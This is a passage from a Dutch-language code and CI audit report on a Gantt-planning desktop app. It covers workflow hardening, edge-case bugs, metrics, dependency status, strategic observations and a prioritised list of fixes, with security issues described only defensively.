- *Plek 1, de `latest.json` read-modify-write-race:* de mechaniek klopt (`upload-version-json.ts` op de gepinde tag doet download → merge → delete → upload, zonder lock of ETag), maar de raamgrootte is klein — in de gemeten run eindigde de Ubuntu-leg 63 seconden vóór macOS, tegen een RMW-venster van seconden — en `latest.json` van v2026.7.12 bevat alle tien platformsleutels. Deze bug heeft in 24 releases nooit toegeslagen: MIDDEL. **Wel belangrijk:** de voorgestelde fix `max-parallel: 1` werkt alléén omdat tauri-action `platforms` *merget* in plaats van overschrijft. Die load-bearing aanname stond niet in het rapport.

**`live.yml` is de zwaarste blast radius met de zwakste poort ervoor** — alle drie de punten bevestigd, en beter onderbouwd dan het rapport zelf deed. De aangeroepen reusable workflow komt uit een **andere repo, gepind op `@main`**, met de deploy-SSH-key: iedereen met write op `OpenAEC-Foundation/github` kan die bij de volgende push exfiltreren. Die workflow deployt met **`rsync -az --delete`** — niet-atomisch, geen symlink-swap — en `live.yml` staat op `cancel-in-progress: true`, dus twee snelle pushes laten letterlijk een halve site achter (deletes toegepast, nieuwe bestanden incompleet).

**Nog een gemiste verouderde comment.** `release.yml:230-233` zegt dat de tauri-action van `build-windows` ook een `latest.json` merget — maar regel 134 zet `includeUpdaterJson: false`. In een bestand waarvan de comments het institutionele geheugen zijn (ze documenteren drie echte productiestoringen) is een comment die het tegenovergestelde beschrijft precies de valstrik die de volgende storing veroorzaakt. Het rapport prees de comments zonder ze te controleren.

**Ingetrokken.** Sectie 4 punt 11 ("`grep -q … || exit 1` toevoegen") is een no-op: de defaultshell voor `run:` op Linux is `bash -e {0}`, dus een `grep` die niets vindt faalt de stap al — het voorstel gooit alleen nuttige console-output weg. Het echte gat in die job zit bij **regel 208** (`gh release upload` van zip+sig): faalt die stil, dan schrijft de stap een `latest.json` met een URL naar een nooit-geüploade asset → kapotte Windows-updater bij een groene run.

**Verder, bevestigd en van lagere urgentie:** `npm install` in `ci.yml:45,62` en `release.yml:92,124` tegenover `npm ci` in alleen `live.yml` — precies verkeerd om, want CI valideert de lockfile daardoor nooit; geen `concurrency` behalve in `live.yml`; nergens `timeout-minutes`; nul caching (npm noch Rust, over een 3-platformmatrix); vijf third-party actions op mutable refs waarvan `dtolnay/rust-toolchain@stable` een **branch** is die met de signing key in de env draait; geen `dependabot.yml`, `SECURITY.md` of templates; en een dode stap in `ci.yml:34-36` waardoor de universal-macOS-build **nooit in CI gevalideerd wordt** — een universal-only fout verschijnt pas midden in een onomkeerbare release.

`auto-assign-issues.yml` is veruit de best-gehardende workflow (expliciete minimale `permissions`, correct `await`, geen interpolatie van gebruikersdata) en verdient gebruik als referentiepatroon.

### 3.7 Edgecases & robuustheid

*Details: `deelrapporten/rapport-edgecases.md` + `reviews/review-edgecases.md`.* Review-oordeel: **"ja"** — het enige onvoorwaardelijke van de tien. De review vond **geen enkele valse (c)-classificatie** en constateerde dat het rapport de ernst nergens overdrijft; waar het misgaat is puur kwantitatief, en meestal in de richting van een *onderschatting* van de reikwijdte.

Bevestigd en elders al behandeld: K1 (`parseDate`), K2 (`);`-corruptie), K4 (niet-atomaire recovery, via `review-ifc` en `review-big-picture-systemisch`), K5 (twee instanties), K8 (opslagfouten ongevangen).

**Gereproduceerd tegen de echte store:**

- **Een taak-kalender zonder werkdagen is niet geguard.** De guard op `CPMSolver.ts:365` toetst uitsluitend `this.projectEngine.hasWorkingDays()`; een bibliotheek-kalender met `workDays: []` op één taak passeert. Probe-uitkomst, exact zoals geclaimd: `es=2028-06-04`, `ef=2029-06-06`, `tf=-1` en **`cpmResult.error === undefined`**. Het `MAX_SCAN`-vangnet in `CalendarEngine:130` geeft bij verzadiging `current` terug — plausibel ogende maar verzonnen datums twee jaar verderop, zonder fout, die zich door de hele planning voortplanten.
- **Alle vier de NaN-gaten zijn reëel.** `setZoom(NaN)` → `zoom = NaN` zonder exception; `setScroll(NaN,NaN)` → beide NaN (`viewSlice.ts:67-71,102-107`); `setTaskProgress(id, NaN)` → `completion` én `remainingTime` NaN, want `Math.max(0,Math.min(1,NaN)) === NaN` (`taskSlice.ts:838`); duur `NaN` → `ef === es`, `scheduleDuration = NaN` blijft in de store en gaat mee naar IFC, met `error === undefined`. Lag-waarden zijn wél correct met `Number.isFinite` geguard. De fix is triviaal: `Number.isFinite`-guards op deze vier ingangen.

**Gereproduceerd, maar met gecorrigeerde getallen — gebruik deze, niet de originele:**

- **`dfsVisit` is recursieve DFS zonder dieptegrens** (`CPMSolver.ts:432-465`) en `runCPM` heeft geen try/catch. Het deelrapport claimde "8.000 OK / 10.000 `RangeError`"; geïsoleerd hermeten in Node v22 breekt een FS-keten **al rond 4.500 knopen (4.000 OK, 4.500 gooit)** — ongeveer de helft, en stack- en versieafhankelijk. State-integriteit is bevestigd: na de throw is `tasks.length` ongewijzigd en `cpmResult` niet overschreven. Realistische projecten zijn breed, niet diep; de gebruiker krijgt wel een stille dode F5, wat de classificatie richting (c) trekt.
- **De undo-stack is een geheugen- en prestatieprobleem, geen crashpad.** Gemeten bij 800 taken: `undoStack.length = 802`, **~150 MB geserialiseerd / ~346 MB heap** — niet de 524 MB uit het deelrapport (1,5–3,5× te hoog). En de `RangeError: Invalid string length` bij 1.600 taken is een **meet-artefact van `JSON.stringify(undoStack)`**: de app serialiseert de undo-stack nergens zelf (rol `'none'` in het documentcontract). De echte schade is geheugenopblazing plus een superlineaire `addTask` (3 → 6 → 14 ms bij 400/800/1600 taken), niet een crash.

**Bevestigd via een andere review:** de incomplete klembord-remapping. `pasteTasks` (`taskSlice.ts:677-761`) filtert `resourceIds` en `assignments` op bestaan, maar `calendarId`, `activityCodes` en `customFields` gaan via `JSON.parse(JSON.stringify(...))` letterlijk mee. Een 6-daagse-werkweek-taak wordt in document B stil 5-daags gepland omdat `resolveCalendar.ts:15` terugvalt op de projectkalender — en gaat via K7 mee de export in.

**Alleen op leesniveau of ongeverifieerd — behandel als onzeker:**

- **Uurkalender zonder werkbanden.** `hasWorkingDays()` (`CalendarEngine.ts:95-97`) kijkt naar `calendar.workDays` en niet naar `workTime.byWeekday`; `addWorkMinutes` breekt af op `if (!band) break;` (`:488`). Het pad is dwingend maar niet end-to-end door de store gedraaid: een 4-uurstaak wordt vermoedelijk stil een nul-lengte mijlpaal.
- **De UI-prestatiemuren.** `resourceNames` in `filterEval.ts:24-29` is O(n·m) — geclaimd 1.504 ms sorteren bij 4.000 taken; `TableEditor` heeft geen virtualisatie (`:520`, plus een `includes()` per rij op `:545-546`); en het RTL-`textAlign`-effect op balklabels vereist expliciet een echte browser. Alle drie blijven `[VERMOED]`.
- **De recovery-claims uit §4.1, §5.1 en §5.2** van het deelrapport stonden niet op de verifieerlijst van deze review — maar de kern ervan (K4, K5, K8) is wél door twee ándere reviews bevestigd.
- **Geen bestandsnaam-sanitisatie**: vijf callsites interpoleren `project.name` rauw, en `project.name` komt mede uit het geopende bestand.

**Wat de sweep als correct bestempelde en dat vermoedelijk ook is:** schrikkeljaren en jaargrenzen, cyclusdetectie, dubbele relaties, 0-duur-mijlpalen, hammocks zonder kinderen, MSO-constraints na een deadline, lead-afkapping, klemmen van geïmporteerde `completion` inclusief NaN, canvas-culling, zoom-to-fit-randen, en de float-precisie in uurmodus (de `interferingFloat == totalFloat − freeFloat`-invariant houdt met 1e-9-tolerantie over alle 431 cases). Unicode round-trippt verrassend robuust — maar alleen omdat beide kanten dezelfde niet-conforme conventie hanteren; voor externe tools zijn die bestanden ongeldig (zie K2).

### 3.8 Metrieken & dependencies

*Details: `deelrapporten/rapport-metrieken.md` + `reviews/review-metrieken.md`.* Review: "voorwaardelijk door"; de meetbare kern reproduceert bijna overal exact.

**Hertelde en bevestigde kerncijfers:** 249 bestanden / 49.860 regels in `src/`; mediane bestandsgrootte 122 regels; 32 bestanden boven 400 regels, 9 boven 700; Rust 83 regels; de volledige top-15 grootste bestanden; de mappenverdeling; 0 `: any`, 0 `as any`, 15 `as unknown as`, 1 `@ts-expect-error`; 106 catch-blokken waarvan 6 leeg (alle in `appLog.ts`, correct — een log-bus mag zichzelf niet crashen); 56 `console.*` over 17 bestanden; alle vijf de major-achterstanden; alle negen dode exports; de MenuBar-historie (`17f25f9` "dode MenuBar verwijderd" → `ad1e6e7` her-toegevoegd); geen lint of audit in `ci.yml`.

**Correcties.** `GanttCanvas.tsx` heeft **60** `useAppStore(`-selectors, niet 71 (de overige tien zijn `useAppStore.getState()`, die niet abonneren) en **8** `useState`, niet 9. De TODO/FIXME-teller: er zijn zes grep-treffers, allemaal verwijzingen naar `docs/TODO.md` — de conclusie (nul markers) klopt, het getal niet. `visibleRows.ts` is het enige binaire *TypeScript*-bestand, niet het enige binaire bestand (vier `.ttf`'s en `hb-subset.wasm` zijn er ook). De duplicatieclaim P6↔MSPDI ("102 identieke regels, 27 %") is niet reproduceerbaar. En de churn-methodiek staat er niet bij: de voor de hand liggende reproductie (`git log --oneline -- <pad>`) geeft 15/12/9/4 waar het rapport 16/14/11/11 claimt; pas met `--no-merges --full-history` komt het uit.

**De NUL-byte is echt en triviaal te fixen.** `src/engine/view/visibleRows.ts:36` bevat een letterlijke NUL-byte in `NONE_RAWKEY`. Ripgrep classificeert het bestand daardoor als binair en **slaat het stil over bij elke zoekactie** — GNU grep vindt het wel. Dat is niet alleen hinderlijk: het betekent dat elke grep-gebaseerde meting in dit hele onderzoek dat bestand heeft gemist. De claim "nul `useAppStore`-treffers in `src/engine/`" houdt bij hercontrole met `--text` toevallig stand, maar was niet aantoonbaar. Eén teken repareert dit, plus een `.gitattributes`-regel.

**Het Draw2D-voorstel is weerlegd en moet vervallen.** Het rapport stelde: *"Laat `GanttRenderer` op de `Draw2D`-abstractie draaien (daar expliciet voor gebouwd, zie `draw2d.ts:8`)"*. Die regel zegt letterlijk het tegenovergestelde: Draw2D is *"de gesloten teken-abstractie waar de **print-renderer** tegenaan tekent"* en *"bewust minimaal en vast: **exact de primitieven die `printPreview.ts` gebruikt**"*. Draw2D is gebouwd vóór printPreview, niet voor GanttRenderer, en met opzet dichtgetimmerd. De review telde de ontbrekende primitieven: `arc`, `clip`, `createPattern`, `globalAlpha`, `rect`, `save`, `restore`, `rotate`, `translate` — negen stuks, waarvan `createPattern`, `clip` en `globalAlpha` in een pdf-lib-vectorbackend geen triviale toevoegingen zijn. "De abstractie bestaat al, sluit hem aan" is in werkelijkheid: Draw2D uitbreiden met transform-stack, clipping en alpha, en dat in twee backends implementeren. Dat is een ander project.

**Wat van die bevinding wél overeind blijft**, en scherper is dan het rapport het bracht: `printPreview.ts` is een tweede, volledig losstaande Gantt-renderer van 1.105 regels, en de divergentie is meetbaar. `ROW_HEIGHT` is 28 (`GanttCanvas.tsx:35`) vs 24 (`printPreview.ts:13`) vs 26 (`pdfTable.ts:61`) — drie waarheden. En **de print negeert de weekstart-instelling**: `PrintOptions` heeft geen `weekStartDay`-veld en `printPreview.ts:689` roept `getWeekNumber(date)` (ISO-maandag hardcoded) waar `GanttRenderer.ts:794` `getWeekNumberFor(d, weekStartDay)` gebruikt, terwijl de instelling wel degelijk bestaat en bedienbaar is (`settingsRegistry.ts:115`). Dát is de bullet die uitvergroot had moeten worden. De "hardgecodeerde Nederlandse maandnamen" op `:677` zijn daarentegen een **onbereikbare fallback** — de enige aanroeper zet altijd `localizedMonths` (`ReportPanel.tsx:178`), en `GanttRenderer.ts:788` doet precies hetzelfde met een Engelse fallback. Dat is dode code, geen i18n-defect. Het minimumvoorstel (gedeelde constanten + `timelineTiers` + `getWeekNumberFor` in printPreview) deugt wel.

**Dependencies.** Vijf directe deps een major achter: `typescript` 5→7, `vite` 7→8, `@vitejs/plugin-react` 5→6, `i18next` 25→26, `react-i18next` 16→17, plus `lucide-react` 0.x→1.x. Volgorde-advies: eerst typescript (CI's enige poort), dan het i18next-paar met `check-i18n-plurals.ts` als vangnet, dan het vite-paar, dan lucide. `Cargo.toml` heeft geen achterstand.

De `postcss`-CVE (GHSA-r28c-9q8g-f849, "high") moet in proportie: het is een **devDependency**, het lek betreft source-map-loading, en de feitelijke exploiteerbaarheid is nagenoeg nul. Als hygiëne prima om te fixen; als risicopost náást "de gebruiker ziet niet dat opslaan mislukte" is de classificatie misleidend. `autoprefixer` is wél een echte spookdependency: hij staat in devDependencies terwijl `postcss.config.js` alleen `@tailwindcss/postcss` gebruikt, nul verwijzingen.

**Ontbrekende hygiënepoorten** (de gedeelde oorzaak van de NUL-byte, MenuBar en de dode exports): geen eslint, prettier, biome, `.editorconfig` of `.gitattributes`; geen lint-script; geen dead-code-check; geen `npm audit` in CI. Dat de codebase op 0 `any` en 0 TODO's zit is discipline — maar persoonsafhankelijke discipline. Een minimale flat-config (`no-floating-promises`, `no-control-regex`, `no-console` met allowlist, `import/no-cycle`) plus `knip` dekt het zonder stijldiscussies.

**`tests/planning/run.sh`** is 243 regels met 19 esbuild-aanroepen en 17 identieke `--define`-blokken (~56 % copy-paste) en heeft de hoogste churn van alle testbestanden. Een nieuwe check betekent drie gecorreleerde edits; vergeet je het `run.sh`-blok, dan draait je test stilzwijgend nooit.

### 3.9 Strategisch beeld

*Details: `deelrapporten/rapport-big-picture-strategisch.md` + `reviews/review-big-picture-strategisch.md`.* Review-oordeel: **"nee"** — de richting deugt, het bewijsapparaat was niet leverbaar. Neem de observaties hieronder daarom met terughoudendheid; ik neem alleen op wat de review expliciet bevestigde.

**Bevestigd en behouden:** IFC-native is reëel bezit, geen marketing — alle domeindata round-trippt aantoonbaar, en het is de enige claim in de feature-matrix waar elke concurrent een streepje heeft. De afwijzing van IfcOpenShell/MPXJ (JVM strijdig met de lichte architectuur) is correct; `web-ifc` is geoptimaliseerd voor geometrie, niet voor `IfcWorkSchedule`. Eigen parser houden is de juiste strategie; de huidige regex-implementatie niet (zie K2). De runtime-afhankelijkheden zijn opvallend mager (**23** productiedeps, niet 30) — geen chart-lib, geen datum-lib, geen UI-kit. De `isTauri()`-splitsing is de best beheerste van de vier grote architectuurkeuzes.

**Belangrijke correcties.**
- **Het zijn 12 pull requests, niet 24** — GitHub deelt de nummering met issues. De belangrijkste bus-factor-statistiek was verdubbeld. Dát ze alle twaalf van `Nozzit` komen klopt wel. En `DutchSailor` (auteur van het MPXJ-aanbod in issue #17) stond als **requested reviewer** op PR #1–4 — geen anonieme buitenstaander. Repo: 5 sterren, 0 forks.
- **"De roadmap is 24× groter dan wat af is" is een ongeldige gevolgtrekking.** De ratio 285/12 klopt, maar alle twaalf vinkjes staan in Fase 2.5, terwijl alle 46 vakjes van Fase 1 — "Gantt Canvas renderer", "CPM forward pass", "IFC 4.3 reader", "Undo/redo" — **open** staan terwijl ze aantoonbaar draaien. De ratio meet documentonderhoud, niet opleveringsgraad. Het rapport spreekt zichzelf bovendien tegen: observatie 14 stelt dat fase 2.1–2.10 volledig af is, wat 62 open vakjes zou zijn die volgens die observatie niet open zijn.
- **Het project is ~6 maanden oud, niet 3.** De repo is aangemaakt op 2026-01-17; v2026.2.0 (2026-02-23) bevatte volgens zijn eigen changelog al Gantt-canvas, CPM, IFC-lezen/schrijven, ribbon, tabeleditor, rapportpaneel én 14 talen. Daarna niets tot v2026.6.0 (2026-06-24). De doorlooptijd is een **julipiek**, geen steady state — wat de capaciteitsanalyse eerder versterkt dan verzwakt.
- **De prestatiecijfers zijn verkeerd gelabeld.** Uit de eigen audit: bij 2.500 taken kost `solve()` **5.393 ms** en de store-actie `runCPM()` **21.354 ms**. Het rapport schreef "2.500 taken = 21,4 s per solve" — factor 4 mis op het getal waar de hele schaalbaarheidsconclusie op rust. Belangrijker: de audit noemt een **derde, onafhankelijke hotspot** die het rapport oversloeg: `B2 — O(n²) WBS-nummering, flattenOrder (utils/wbs.ts:10-29)`, goed voor `addTask` 16,2 s en `deleteTask` 7,3 s bij 5.000 taken — het *bewerk*pad, dat élke toevoeging treft, ook zonder F5. De "één keten in één functie"-geruststelling is dus onjuist. En "renderer gezond (0,4 ms)" is selectief: dezelfde audit noemt de niet-gecullde pijlenlaag als 84–96 % van een render. De audit merkt zelf op dat absolute ms **indicatief** zijn en dat de 2500/5000-metingen in de browser openstaan; het rapport verkocht ze als "gemeten".
- **Overige telfouten:** unieke CI-secrets 11 (niet 12); `docs/superpowers/` 43 bestanden (niet 49); `OPS_*`-psets 17 (niet 13). Van de negen "spookonderdelen" in PLAN.md bestaat Playwright wél.

**Wat blijft staan als strategisch signaal:** één maintainer draagt een portfolio van 14 talen (elke string ×14, ~190 kB gzip eager geladen, een merge met 14 locale-conflicten), 350 doc-artikelen, vijf distributiekanalen, een eigen PDF-typografie-engine (2.025 regels over `src/services/pdf/`, wél voor drie rapporttypes en niet "één exportknop") en een Snap-keten die nooit geregistreerd is. En er is beginnende internationale tractie — vijf externe melders in drie weken — precies het moment waarop een project contributors aantrekt of verliest. De enkele architecturale schuld die drie roadmap-items tegelijk blokkeert is de **store-singleton** (split view met twee documenten, cross-project solve, resources over meerdere projecten).

Belangrijke waarschuwing bij het voorstel om de taalportfolio te bevriezen op nl/en/de met Engels-fallback voor de rest: i18next valt bij een **ontbrekende pluralcategorie** niet terug binnen dezelfde taal maar naar `fallbackLng`. "Community-onderhouden met fallback" betekent dus gemengde taal per scherm, niet per taal — dat is precies waarvoor `check-i18n-plurals` (909 checks) bestaat.

---

## 4. Wat expliciet goed is

Dit hoort in het rapport omdat het de standaard zet waaraan de rest gemeten moet worden — en omdat het bij een lijst van elf kritieke bevindingen anders wegvalt.

1. **Het documentcontract** (`src/state/documentContract.ts`). Eén key-gedreven veldregister dat payload, hydrate, reset, recovery én undo-snapshot voedt, met twee compile-time volledigheidschecks — en `snapshot.ts:53-60` doet hetzelfde tweezijdig tussen de snapshot-rol en de `Snapshot`-`Pick<>`. Dit is zeldzaam; de reviews hebben de asserts zelf geschreven en gevalideerd.
2. **`transaction.ts`**. Het mutatie-ritueel op één plek, met de bewuste asymmetrieën expliciet gedocumenteerd, undo-coalescing, en "guard-vóór-snapshot" als consequent doorgevoerde conventie over alle 56 callsites.
3. **De engine-grens.** Nul store-imports in `src/engine/`; `GanttRenderer` krijgt alles via `GanttRenderOptions` en schrijft nergens naar `Task`-objecten; de scheduler is even zuiver. Dit is de enkele architectuurkeuze die de hele headless testsuite mogelijk maakt.
4. **De testsuite waar hij dekt.** Anti-circulaire verwachtingen (voorgerekend uit CPM-leerboeken, met een onafhankelijke `caldict.mjs`), `satisfies Required<…>`-fixtures, key-gedreven contracttests die zelf over `DOCUMENT_FIELDS` itereren, en `KNOWN_GAPS` die falen zodra een gat gedicht wordt. `check-document-contract.ts` is 612 regels die het contract met échte store-acties testen.
5. **De single-source-registries in de IFC-laag.** `ifcConstants.ts:33,54` leidt de reader-inverses **programmatisch** af uit de writer-maps; `ifcTaskSlots.ts` maakt van de arg-index één bron in plaats van drie; `ifcPsets.ts` co-lokeert write- en read-kant per pset. Dat is precies de juiste reflex op deze bugklasse. En `buildWriteIFCInput` (`ifcSaveInput.ts`) is één plek die bepaalt welke velden in een IFC-save meegaan.
6. **De platformsplit.** Nul top-level `@tauri-apps/*`-imports in heel `src/`, één definitie van `isTauri()` (`utils/platform.ts:8`), 39 aanroepen consequent correct, `fileAccess` als klein en scherp abstractiepunt (298 regels, 4 bestanden), en meerdere expliciete `KRITIEK:`-comments op de plekken waar het mis kan gaan. Feature-gedetecteerd, niet browser-gedetecteerd.
7. **De ribbon als registry.** `ribbonConfig.tsx` is een echte registry met drie item-soorten en een escape-hatch (`kind:'component'`) voor de 14 widgets; gedeelde items worden hergebruikt; een knop toevoegen is één object-literal van vier regels; de rules-of-hooks zijn bewust afgedekt. De review noemde dit "het beste stuk".
8. **De type-hygiëne.** Nul `any` in 49.860 regels is geen toeval en geen kleinigheid. Idem nul TODO/FIXME/HACK-markers, 17,5 % commentaar dat vrijwel overal *motiveert* in plaats van herhaalt, en de zes lege `catch {}`-blokken die allemaal in de log-bus zitten waar ze horen.
9. **`auto-assign-issues.yml`.** Expliciete minimale `permissions`, correct `await`, geen interpolatie van gebruikersdata. Als referentiepatroon voor de andere vier workflows.
10. **De eigen audit-cultuur.** `docs/superpowers/prestatie-modulariteit-audit.md` heeft de prestatie-attributie al gedaan en met pakketnummers vastgelegd; `docs/TODO.md` is actueel, gedateerd en bevat zelfs verworpen hypotheses; de changelog is uitstekend; de commitberichten zijn consequent conventional mét aanleiding en issue-verwijzing. Meerdere bevindingen in dit onderzoek stonden al in die documenten — dat is een goed teken over het diagnostisch vermogen van het project, en een slecht teken over de doorloop naar uitvoering.

---

## 5. Prioritering

Drie fasen. Binnen elke fase zijn samenhangende items gegroepeerd, want de volgorde binnen een groep is vaak dwingend (bijvoorbeeld: de `canon`-fix vóór de round-trip-verbouwing; de GUID-ontkoppeling vóór de collisiecheck).

Omvang: **XS** < 1 uur · **S** halve dag · **M** 1–3 dagen · **L** > een week.

### Nu (deze week)

| # | Ingreep | Omvang | Waarom deze volgorde |
|---|---|---|---|
| 1 | **K1** — `parseDate` tekstueel parsen + `TZ`-matrix in `run.sh` | S | Enige geverifieerde live productiebug die *alle* gebruikers in een tijdzone raakt. Eén functie, en de suite bewijst het effect meteen (311/431 → 431/431). |
| 2 | **K3** — baselines in `useRecoveryRestore` + velden verplicht in `RecoveryDocInput` | XS | Live dataverlies, twee regels, direct verifieerbaar. Doe het samen met een assert in `check-document-contract.ts`. |
| 3 | **K6a** — de drie `dangerouslySetInnerHTML`-sites + `read_file`/`write_file` uit de `invoke_handler` | XS | Twaalf regels sluiten de enige kwetsbaarheid die vuurt zonder dat de gebruiker een extensie activeert. |
| 4 | **K11a** — versievergelijking + testpoort als gate-job in `release.yml`; `live.yml` achter een success-gate | S | Samen één ingreep in dezelfde YAML. Dit is de goedkoopste hoog-rendement-fix in het hele onderzoek en beschermt tegelijk tegen K9 en de stille-release-faalmodus. |
| 5 | **K11b** — `snap.yml` omhangen aan `workflow_run` met success-gate | XS | Lost in één ingreep de dispatch-gap, de 30-minuten-pollinglus én de Snap-Store-volgorde op. v2026.7.12 mist nu aantoonbaar zijn Snap. |
| 6 | **K7** — `runCPM`-guard in `exportAs` (beide callsites) + PDF-export, mét afbreken op `cpmResult.error` | XS | Eén regel per callsite; het is de enige keten waarvan de schade bij derden landt. |
| 7 | **K9b** — `run.sh`: stderr niet onderdrukken, `\|\| STATUS=1` per bundelstap | XS | Zonder dit is elke rode CI-run na item 4 een lege log. Moet dus vóór of tegelijk met de poorten. |
| 8 | Undo-stack cappen (`if (s.undoStack.length > MAX_UNDO) s.undoStack.shift();`) | XS | Twee regels, gedekt door de bestaande contract-suite, haalt het grootste geheugenrisico weg. |
| 9 | `payloadFromInput` → `scheduleStale: true` (of recompute in `switchDocument`) | XS | Sluit het laatste stille correctheidsgat in het CPM-contract, in een verscheept gebruikerspad. |
| 10 | NUL-byte in `visibleRows.ts:36` + `.gitattributes` | XS | Eén teken. Elke grep-gebaseerde meting in dit onderzoek was zonder dit onbetrouwbaar. |
| 11 | `LICENSE`-bestand + `"license"` in `package.json` | XS | Juridisch: zonder dit is de code alle-rechten-voorbehouden terwijl vijf plekken LGPL-3.0 claimen. |
| 12 | Dode vensterknoppen (`TitleBar.tsx:150-159`), `dd-mm-jjjj` via `t()`, dode zoom-sectie, `MenuBar.tsx` + de 196 dode vertaalregels | S | Vier onafhankelijk bevestigde triviale posten, samen minder dan een dagdeel. MenuBar stond al ingepland als Task 10. |

### Deze maand

| # | Ingreep | Omvang | Waarom |
|---|---|---|---|
| 13 | **K2** — regressiebatterij met de vier faalvectoren, dan de quote-bewuste scan over alle drie de lagen, dan header-escaping in de writer | M | De batterij móét eerst: dit raakt de kernroute van het enige persistentieformaat én de auto-save. De volgorde binnen het item is niet vrij. |
| 14 | **K10a** — `canon` sleutel-gedreven maken voor alle acht domeintypes | S–M | Zonder dit ontsnapt de volgende K2/K3 net zo hard. Doe het vóór of tegelijk met item 13, want het is het vangnet eronder. |
| 15 | **K10b** — `tsconfig.tests.json` in CI + discriminated `Case`-interface + batterij-telling in `run.sh` | S | Root cause van de vacuüm-groene cases. Eén tsconfig lost drie losse bevindingen op. |
| 16 | **K4** — temp+rename in `saveTauri`, `IfcParseError` in `readIFC`, `clearRecovery()` ná geslaagde restore, manifest-fallback | M | Groepeer met item 13: de integriteitscheck in `readIFC` leunt op dezelfde parserverbouwing. |
| 17 | **K5** — `tauri-plugin-single-instance` + opruimlus beperken tot het eigen vorige manifest | S | Hoort bij item 16 — samen maken ze de recovery-laag betrouwbaar in plaats van half. |
| 18 | **K8** — toast-state van `GanttCanvas` naar `uiSlice`, I/O-paden erop aansluiten, `saveFile` in try/catch, `alert()` vervangen | M | Vermenigvuldiger: maakt K4, K5, K11 én de updateketen in één klap diagnosticeerbaar voor de gebruiker. Duurder dan "een helper" omdat de toast eerst omhoog moet. |
| 19 | `npm ci` ×4, `cache: npm`, `Swatinem/rust-cache`, `timeout-minutes`, `concurrency` op release/snap | S | Reproduceerbaarheid plus een realistische halvering van de CI-wandkloktijd voor ~10 regels YAML. |
| 20 | O1 — de zeven injectielocaties via `env:` + CalVer-whitelist; `live.yml:18` op SHA pinnen; `cancel-in-progress: false` | S | Sluit de injectieklasse. `release.yml:158` is de enige met signing-secrets in scope; de rest is hardening. `live.yml` beschermt de deploysleutel boven een `rsync --delete`. |
| 21 | `tests/dev-server` in CI + `test`/`typecheck`/`verify`-scripts in `package.json` | XS | Dertig groene tests die vandaag door niets gedraaid worden, over precies de flock-races die stil breken. |
| 22 | `i18n-diff.mjs` een `process.exit` geven + `verify:i18n` in `package.json` en `ci.yml`, met allowlist voor bewust-identieke sleutels | S | Het script bestaat en is correct; het eindigt alleen altijd met exit 0. |
| 23 | `CLAUDE.md`/`AGENTS.md` actualiseren: dev-server, auto-save-throttle, `documentContract`/`snapshot`/`transaction`, `public/docs`, testtellingen machineleesbaar; banner boven `PLAN.md` §4/§10 | S | Zonder dit reproduceert elke volgende bijdrager opgeloste bugklassen. Combineer met een uitbreiding van `verify-docs.ts` naar machinaal controleerbare CLAUDE.md-beweringen, zodat het niet opnieuw drift. |
| 24 | `CONTRIBUTING.md` + `SECURITY.md` in de root, issue-/PR-templates, `CODEOWNERS` ↔ auto-assign gelijktrekken | XS | Er is beginnende externe tractie en een code-uitvoerend extensiesysteem zonder disclosure-kanaal. |
| 25 | `docs/release-secrets.md`: minisign-bewaarplek en -rotatie, Azure-vervaldata met agenda, dubbel-pubkey-migratiepad | S | De enige onherstelbare SPOF. Goedkoop op te schrijven, oneindig duur om te ontdekken dat het ontbreekt. |

### Structureel

| # | Ingreep | Omvang | Waarom later |
|---|---|---|---|
| 26 | `_assertNoUnclassifiedState` (met derde categorie `DerivedKey`) + de drie taak-id's in `UIState` resetten bij documentwissel + `dependencySourceId` verwijderen | S | Sluit de laatste opening in een verder waterdicht contract, maar er is geen acuut bewijs van schade. |
| 27 | Defaults naar `src/state/defaults.ts` + `madge --circular` of `import/no-cycle` in CI | S | Verwijdert een latente crash die vandaag alleen door function-hoisting wordt tegengehouden. |
| 28 | Minimale ESLint-flat-config + `knip`/`ts-prune` + `npm audit --audit-level=high` in CI; postcss updaten; `autoprefixer` verwijderen | S | Gedeelde oorzaak van de NUL-byte, MenuBar en de negen dode exports. Geen stijlregels — alleen `no-floating-promises`, `no-control-regex`, `no-console`, `import/no-cycle`. |
| 29 | `ifcGuid`: eerst de ontkoppeling (expliciete `Map<internalId, stepGuid>` wegschrijven), dán een collisiecheck | S–M | Volgorde is de hele fix: een collisiecheck vóór de ontkoppeling breekt de baseline-remap, omdat de reader de GUID herberekent. |
| 30 | `applyCpmResult` extraheren uit `scheduleSlice` (valt samen met audit-pakket A3/M3) en de benchmark-kopie vervangen | S | De benchmark meet vandaag niet meer wat de app doet. |
| 31 | `taskSlice.ts:161` naar `project.startDate` (haalt negen van de elf `createDefaultTaskTime`-callsites weg) | XS | Goedkope voorloper op item 34; doe deze los, hij is de hele "duplicatie"-bevinding waard. |
| 32 | `withTransaction(fn)` + `api.data.batch(fn)` voor extensies | S | Maakt bulk-mutaties lineair in plaats van kwadratisch; ~20 regels. |
| 33 | `buildGanttRenderOptions(state, layout)` extraheren; `GanttCanvas` opsplitsen langs de bestaande hook-conventie | M | Haalt ~40 selectors uit een component van 1.426 regels en maakt de render-opties headless testbaar. #1 hotspot op churn × grootte. |
| 34 | `COMMANDS`-register — mét het tweedelige contract (imperatieve `run` + reactieve `useEnabled`) | L | Maakt de contextmenu-ontkoppeling en het afslanken van `GanttCanvas` goedkoper, dus ná item 33 en 31 en niet ervoor. |
| 35 | `taskTree.ts` extraheren (`detach`/`insertAt`/`isDescendant`/`siblingIds`) + selectie/klembord naar een eigen slice | M | Zet de drievoudige waarheidsbron (`parentId`/`childIds`/rauwe volgorde) op één plek en maakt hem als pure functies testbaar. |
| 36 | Prestaties: `workDaysBetween`/`isWorkDay` naar een werkdag-prefixsom per kalender; `flattenOrder` (`utils/wbs.ts:10-29`) de-kwadrateren; `resourceNames` een index-Map geven; pijlenlaag cullen | M–L | Drie onafhankelijke hotspots, waarvan `flattenOrder` het *bewerk*pad raakt (dus ook zonder F5). Behandel als productbeslissing en publiceer daarna een expliciete grens ("ontworpen tot N taken"). |
| 37 | Extensie-API: `apiVersion`-veld (semver) los van `minAppVersion`; eigen `ExtRibbonTab`/`ExtFontProvider` in `extTypes`; `check-ext-contract.ts` met `satisfies Required<Ext*>` | M | CalVer draagt geen breaking-change-signaal; de mappers hebben nu geen compile-afdwinging op volledigheid. |
| 38 | Extensies naar een Web Worker (of minimaal `__TAURI_INTERNALS__` afschermen vóór uitvoering) + `sha256` per catalogusentry + consent-dialoog | L | De echte grens. Het API-oppervlak is al een smalle DTO-laag die zich op `postMessage` laat zetten; tot die tijd zijn items 3 en de checksum de pragmatische afdekking. |
